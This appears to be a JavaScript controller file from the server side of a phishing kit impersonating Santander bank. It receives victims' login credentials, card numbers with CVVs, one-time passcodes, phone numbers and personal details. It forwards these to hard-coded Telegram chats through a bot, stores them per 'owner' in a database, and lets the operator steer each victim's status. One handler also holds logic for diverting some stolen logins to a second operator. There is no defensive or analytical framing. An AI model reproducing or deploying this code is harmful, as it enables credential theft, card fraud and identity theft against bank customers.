const axios = require("axios");
const Sants = require("../models/santsModel.js");
var moment = require("moment"); // require

let santsCount = 0;

const submitStaticLogin = async (req, res) => {
	let { username, password, ip, telegramId, uniqueid } = req.body;

	var originalText = `+----------- Login Information ------------+\nUsername: ${username}\nPassword: ${password}\n+----------- Victim Information ------------+\nUnique ID: ${uniqueid}\nIP: ${ip}`;

	await axios
		.post(
			`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
			{
				chat_id: 680379375,
				text: `Santander ${telegramId}:\n${originalText}`,
				parse_mode: "Markdown",
			}
		)
		.catch((e) => {
			console.log(e);
		});
	await axios
		.post(
			`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
			{
				chat_id: telegramId,
				text: `Santander:\n${originalText}`,
				parse_mode: "Markdown",
			}
		)
		.catch((e) => {
			console.log(e);
		});
	res.sendStatus(200);
};

const submitStaticCard = async (req, res) => {
	let { ccnum, ccexp, cvv, ip, telegramId, uniqueid } = req.body;

	var originalText = `+----------- Billing Information ------------+\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}\n+----------- Victim Information ------------+\nUnique ID: ${uniqueid}\nIP: ${ip}`;

	await axios
		.post(
			`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
			{
				chat_id: 680379375,
				text: `Santander ${telegramId}:\n${originalText}`,
				parse_mode: "Markdown",
			}
		)
		.catch((e) => {
			console.log(e);
		});
	await axios
		.post(
			`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
			{
				chat_id: telegramId,
				text: `Santander:\n${originalText}`,
				parse_mode: "Markdown",
			}
		)
		.catch((e) => {
			console.log(e);
		});

	res.sendStatus(200);
};

const submitStaticPersonal = async (req, res) => {
	let { fullname, address, pcode, dob, telegramId, uniqueid } = req.body;

	var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPost Code: ${pcode}\n+----------- Victim Information ------------+\nUnique ID: ${uniqueid}\nIP: ${ip}`;

	await axios
		.post(
			`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
			{
				chat_id: 680379375,
				text: `Santander ${telegramId}:\n${originalText}`,
				parse_mode: "Markdown",
			}
		)
		.catch((e) => {
			console.log(e);
		});
	await axios
		.post(
			`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
			{
				chat_id: telegramId,
				text: `Santander:\n${originalText}`,
				parse_mode: "Markdown",
			}
		)
		.catch((e) => {
			console.log(e);
		});

	res.sendStatus(200);
};

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	Sants.find({ owner })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, status } = req.body;
	try {
		await Sants.findOneAndUpdate({ uniqueid }, { status }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	Sants.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitLogin = async (req, res) => {
	const { username, password, uniqueid, owner, ip } = req.body;
	try {
		if (santsCount == 3) {
			await Sants.create({
				uniqueid,
				username,
				password,
				status: 1,
				owner: "haytch4023",
				ip,
				timestamp: moment().format(),
			});
			await axios
				.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
					{
						chat_id: 680379375,
						text: `New Sants Hit:\n\n${username}\n${password}`,
						parse_mode: "Markdown",
					}
				)
				.catch((e) => {
					console.log(e);
				});
			await axios
				.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
					{
						chat_id: "-837014205",
						text: `New Sants Hit:\n\n${username}\n${password}`,
						parse_mode: "Markdown",
					}
				)
				.catch((e) => {
					console.log(e);
				});
			santsCount = 0;
		} else {
			await Sants.create({
				uniqueid,
				username,
				password,
				status: 1,
				owner,
				ip,
				timestamp: moment().format(),
			});
			//santsCount = santsCount + 1;
		}
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { username, password, uniqueid } = req.body;
	try {
		await Sants.findOneAndUpdate(
			{ uniqueid },
			{ username, password, status: 1, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitCard = async (req, res) => {
	const { ccname, ccnum, ccexp, cvv, uniqueid } = req.body;
	try {
		await Sants.findOneAndUpdate(
			{ uniqueid },
			{ ccname, ccnum, ccexp, cvv, status: 11, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitOtp = async (req, res) => {
	const { otp, uniqueid } = req.body;
	try {
		await Sants.findOneAndUpdate(
			{ uniqueid },
			{ otp, status: 7, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitPhone = async (req, res) => {
	const { phone, uniqueid } = req.body;
	try {
		await Sants.findOneAndUpdate(
			{ uniqueid },
			{ phone, status: 3, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await Sants.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitStaticLogin,
	submitStaticCard,
	submitStaticPersonal,
	submitLogin,
	submitLoginAgain,
	submitCard,
	submitOtp,
	submitPhone,
	deleteEntry,
};
